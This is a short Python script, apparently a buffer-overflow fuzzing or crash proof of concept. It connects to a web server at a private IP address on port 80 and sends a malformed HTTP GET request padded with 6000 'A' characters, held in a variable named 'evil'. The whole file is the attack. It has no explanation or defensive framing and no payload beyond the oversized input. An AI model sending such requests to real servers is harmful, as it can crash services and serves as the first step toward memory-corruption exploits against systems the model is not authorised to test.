import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(('192.168.1.9',80))

evil = "GET"

evil += "A"*6000 

evil += "HTTP/1.1\r\n\r\n"

sock.send(evil)

sock.close()

#sys.argv[1]
